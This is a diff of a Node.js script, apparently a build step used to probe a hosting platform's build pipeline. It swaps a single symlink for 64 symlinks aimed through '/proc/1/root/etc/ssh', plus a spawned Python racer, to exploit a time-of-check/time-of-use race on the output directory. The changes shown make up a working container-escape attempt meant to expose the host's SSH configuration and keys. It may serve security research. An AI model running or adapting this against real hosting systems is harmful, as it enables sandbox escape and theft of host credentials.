@@ -2,22 +2,32 @@ import fs from "node:fs";
 import path from "node:path";
 import { spawn } from "node:child_process";
 
-const marker = "HOSTINGER_NODE_SSH_LOG_WATCH_TOCTOU_GATE:r224";
+const marker = "HOSTINGER_NODE_NESTED_LOG_WATCH_TOCTOU_GATE:r226";
 const output = path.resolve("dist");
-const alternate = path.resolve("evil-root");
-const versionsRoot = path.resolve(process.cwd(), "..", "..", "versions");
+const alternateRoot = path.resolve("race-alternates");
+const slotCount = 64;
 fs.rmSync(output, { recursive: true, force: true });
-fs.rmSync(alternate, { recursive: true, force: true });
+fs.rmSync(alternateRoot, { recursive: true, force: true });
 fs.mkdirSync(output, { recursive: true });
+fs.mkdirSync(alternateRoot, { recursive: true });
 fs.writeFileSync(path.join(output, "control.txt"), `${marker}:894a8b0f9abe4351\n`, { mode: 0o600 });
 
-const hiddenTarget = "../../../../../../../proc/1/root/etc/ssh";
-let hiddenLink;
-try {
-  fs.symlinkSync(hiddenTarget, alternate);
-  hiddenLink = { created: true, target: hiddenTarget, isSymlink: fs.lstatSync(alternate).isSymbolicLink() };
-} catch (error) {
-  hiddenLink = { created: false, target: hiddenTarget, errorCode: error.code ?? error.name };
+const hiddenTarget = "../../../../../../../../proc/1/root/etc/ssh";
+let createdLinks = 0;
+let setupError = null;
+for (let index = 0; index < slotCount; index += 1) {
+  const suffix = String(index).padStart(2, "0");
+  const slot = path.join(output, `slot-${suffix}`);
+  const alternate = path.join(alternateRoot, `alt-${suffix}`);
+  fs.mkdirSync(slot);
+  fs.writeFileSync(path.join(slot, "control.txt"), `${marker}:${suffix}\n`, { mode: 0o600 });
+  try {
+    fs.symlinkSync(hiddenTarget, alternate);
+    createdLinks += 1;
+  } catch (error) {
+    setupError = error.code ?? error.name;
+    break;
+  }
 }
 
 let directRead;
@@ -36,20 +46,6 @@ try {
   exactTargetProbe = { readable: false, errorCode: error.code ?? error.name };
 }
 
-const outputStat = fs.statSync(output);
-let versionsBefore = [];
-let versionsWatch;
-try {
-  versionsBefore = fs.readdirSync(versionsRoot).sort();
-  fs.writeFileSync(
-    "r221-versions-before.json",
-    JSON.stringify({ versionsRoot, versionsBefore }),
-    { mode: 0o600 },
-  );
-  versionsWatch = { accessible: true, count: versionsBefore.length };
-} catch (error) {
-  versionsWatch = { accessible: false, errorCode: error.code ?? error.name };
-}
 let racer;
 try {
   const child = spawn("python3", ["race-output-root.py"], {
@@ -67,11 +63,10 @@ console.log(JSON.stringify({
   marker,
   directRead,
   exactTargetProbe,
-  hiddenLink,
-  versionsWatch,
+  nestedRace: { slotCount, createdLinks, setupError, hiddenTarget },
   safeOutput: {
-    isDirectory: outputStat.isDirectory(),
-    entries: fs.readdirSync(output).sort(),
+    isDirectory: fs.statSync(output).isDirectory(),
+    entryCount: fs.readdirSync(output).length,
   },
   racer,
   outputRelativeToRepository: path.relative(process.cwd(), output),
